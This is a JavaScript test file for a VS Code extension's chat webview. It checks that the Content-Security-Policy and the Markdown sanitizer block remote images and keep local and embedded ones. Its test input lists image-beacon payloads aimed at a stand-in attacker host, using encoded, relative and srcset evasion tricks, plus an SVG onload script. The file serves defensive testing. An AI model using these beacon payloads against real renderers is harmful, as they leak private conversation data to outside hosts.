import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { register } from "node:module";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

import createDOMPurify from "dompurify";
import { JSDOM } from "jsdom";
import { marked } from "marked";

register(new URL("../scripts/vscode-a11y-loader.mjs", import.meta.url));
const [{ WebviewController }, { Uri }] = await Promise.all([
  import("../out/webviewController.js"),
  import("../scripts/vscode-a11y-mock.mjs"),
]);

const root = path.resolve(fileURLToPath(new URL("..", import.meta.url)));
const clientScript = readFileSync(new URL("../media/webview.js", import.meta.url), "utf8");
const imagePolicySource = clientScript.match(
  /function isAllowedMarkdownImageSource\(value\) \{[\s\S]*?\n\}/u,
)?.[0];
const rendererSource = clientScript.match(
  /function renderMarkdown\(messageNode, raw\) \{[\s\S]*?\n\}/u,
)?.[0];
assert.ok(imagePolicySource && rendererSource, "the actual Markdown renderer must be available");

function render(source) {
  const dom = new JSDOM('<div id="message"><div class="message-body"></div></div>', {
    url: "https://webview.test/",
  });
  const { document } = dom.window;
  const renderMarkdown = new Function(
    "document",
    "DOMPurify",
    "marked",
    `
      const messageBody = (node) => node.querySelector(".message-body");
      const linkifyWorkspaceFiles = () => {};
      const enhanceCodeBlocks = () => {};
      const ensureMessageCopy = () => {};
      const reapplyFindIfActive = () => {};
      ${imagePolicySource}
      ${rendererSource}
      return renderMarkdown;
    `,
  )(document, createDOMPurify(dom.window), marked);
  renderMarkdown(document.getElementById("message"), source);
  return { dom, document };
}

test("chat CSP denies external image beacons before Markdown is parsed", () => {
  const controller = new WebviewController(
    {
      extension: { packageJSON: { version: "security-test" } },
      extensionUri: Uri.file(root),
    },
    false,
    true,
    20 * 1024 * 1024,
  );
  const html = controller.getHtml({
    asWebviewUri: (uri) => `https://webview.test/${path.basename(uri.fsPath)}`,
    cspSource: "https://webview.test",
  });
  const csp = html.match(/http-equiv="Content-Security-Policy"\s+content="([^"]+)"/iu)?.[1];
  assert.ok(csp);
  const imageDirective = csp.split(";").find((entry) => entry.trim().startsWith("img-src "));
  assert.deepEqual(imageDirective.trim().split(/\s+/u).slice(1), ["https://webview.test", "data:"]);
});

test("Markdown and HTML images cannot send remote conversation beacons", () => {
  const { dom, document } = render(`
![beacon](https://attacker.example/collect?private=context)
<img src="http://attacker.example/http">
<img src="//attacker.example/protocol-relative">
<img src="&#104;ttps://attacker.example/entity">
<img src="HTTPS://attacker.example/uppercase">
<img srcset="https://attacker.example/srcset 1x" src="data:image/png;base64,iVBORw0KGgo=">
<img src="data:image/svg+xml,%3Csvg%20onload=alert(1)%3E">
`);
  try {
    const images = [...document.querySelectorAll("img")];
    assert.equal(images.length, 7);
    assert.deepEqual(
      images.filter((image) => image.hasAttribute("src")).map((image) => image.getAttribute("src")),
      ["data:image/png;base64,iVBORw0KGgo="],
    );
    assert.equal(document.querySelectorAll("[srcset], [onload], script").length, 0);
  } finally {
    dom.window.close();
  }
});

test("local resources and embedded raster images remain visible, external links stay manual", () => {
  const { dom, document } = render(`
![paste](data:image/png;base64,iVBORw0KGgo=)
<img src="vscode-resource:/extension/local.png">
<img src="vscode-webview-resource://view/extension/local.png">
[Open reference](https://example.com/reference)
`);
  try {
    assert.deepEqual(
      [...document.querySelectorAll("img")].map((image) => image.getAttribute("src")),
      [
        "data:image/png;base64,iVBORw0KGgo=",
        "vscode-resource:/extension/local.png",
        "vscode-webview-resource://view/extension/local.png",
      ],
    );
    const reference = document.querySelector("a");
    assert.equal(reference.getAttribute("href"), "#");
    assert.equal(reference.getAttribute("data-external-url"), "https://example.com/reference");
  } finally {
    dom.window.close();
  }
});
